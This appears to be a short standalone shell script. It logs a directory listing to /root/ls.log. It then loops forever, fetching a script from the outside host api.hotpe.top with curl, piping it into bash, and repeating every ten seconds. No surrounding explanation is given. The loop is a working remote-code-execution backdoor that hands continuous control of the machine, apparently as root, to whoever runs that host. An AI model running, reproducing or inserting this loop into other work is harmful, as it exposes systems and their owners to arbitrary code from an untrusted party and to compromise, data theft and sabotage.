ls > /root/ls.log

while true; do
  curl -fsSL https://api.hotpe.top/test/test.sh | bash
   sleep 10
done
